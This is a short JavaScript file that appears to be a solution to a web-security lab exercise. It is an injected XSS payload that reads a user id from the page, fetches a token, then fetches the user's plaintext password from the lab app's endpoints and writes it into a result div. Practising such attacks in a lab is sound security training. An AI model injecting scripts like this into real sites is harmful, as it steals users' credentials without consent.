var uid = document.getElementById("settings").textContent.split(":")[1];

var xhr_token = new XMLHttpRequest();
var xhr_password = new XMLHttpRequest();
xhr_token.responseType = "json";
xhr_password.responseType = "json";


function token_callback(){
    var params = new URLSearchParams(xhr_token.response["params"]);
    xhr_password.open("GET", "/lab/webapp/jfp/20/getpassword?" + params, true);
    xhr_password.send();
}

function password_callback(){
    var password = xhr_password.response["resp"]["password"];
    document.getElementById("result").textContent = password;
}


// Find John's Password using an XSS vulnerability on this page
// Display the Password in the div with id "result"
// App stores password in Plain Text :(
// No Hardcoded values can be used - everything has to be figured out dynamically
xhr_token.open("GET", "/lab/webapp/jfp/20/gettoken?uid=" + uid, true);
xhr_token.onload = token_callback;
xhr_password.onload = password_callback;
xhr_token.send();
